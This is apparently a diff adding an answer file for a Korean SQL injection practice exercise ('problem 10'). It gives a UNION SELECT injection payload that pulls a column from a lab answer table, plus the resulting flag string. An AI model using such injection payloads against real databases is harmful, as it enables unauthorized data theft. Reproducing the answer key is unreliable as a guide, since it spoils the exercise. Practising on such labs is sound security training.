@@ -1,0 +1,14 @@
+=============================
+
+SQL Injection Mysql 문제 10번
+
+=============================
+
+10번
+
+1. 삼성동%' UNION SELECT ANSWER_COLUMN, '', '', '', '' FROM SQL_UNION_ANSWER -- -
+
+2. 정답
+this_is_perfect_answer
+=============================
+
